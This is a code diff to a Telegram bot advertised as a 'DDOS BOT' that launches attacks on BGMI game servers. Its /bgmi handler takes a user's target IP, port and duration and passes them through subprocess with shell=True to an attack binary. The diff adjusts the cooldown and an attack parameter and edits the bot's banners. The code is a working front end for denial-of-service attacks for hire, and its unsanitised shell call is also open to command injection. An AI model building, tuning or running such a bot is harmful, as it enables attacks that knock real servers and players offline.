@@ -26,7 +26,7 @@ LOG_FILE = "log.txt"
 KEY_FILE = "keys.json"
 
 # Cooldown settings
-COOLDOWN_TIME = 0  # in seconds
+COOLDOWN_TIME = 200  # in seconds
 CONSECUTIVE_ATTACKS_LIMIT = 9
 CONSECUTIVE_ATTACKS_COOLDOWN = 3 # in seconds
 MAX_RESTARTS = 5
@@ -200,7 +200,7 @@ def handle_bgmi(message):
                     record_command_logs(user_id, '/bgmi', target, port, time)
                     log_command(user_id, target, port, time)
                     start_attack_reply(message, target, port, time)
-                    full_command = f"./bgmi {target} {port} {time} 500"
+                    full_command = f"./bgmi {target} {port} {time} 10"
                     subprocess.run(full_command, shell=True)
                     response = f"𝘼𝙩𝙩𝙖𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 🔥"
             except ValueError:
@@ -232,7 +232,7 @@ def show_all_users(message):
     user_id = str(message.chat.id)
     if user_id in admin_id:
         if users:
-            response = "𝐂𝐇𝐔𝐓𝐘𝐀 𝐔𝐒𝐑𝐄𝐑 𝐋𝐈𝐒𝐓:\n"
+            response = "𝐂𝐇𝐔𝐓𝐘𝐀 𝐔𝐒𝐄𝐑 𝐋𝐈𝐒𝐓:\n"
             for user_id, expiration_date in users.items():
                 try:
                     user_info = bot.get_chat(int(user_id))
@@ -310,7 +310,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''🔹 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙂𝙊𝘿𝙭𝘽𝙂𝙈𝙄 𝘿𝘿𝙊𝙎 𝘽𝙊𝙏 🔹
+    response = f'''🔹 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝘿𝘿𝙊𝙎 𝘽𝙊𝙏 🔹
 '''
     bot.reply_to(message, response)
 
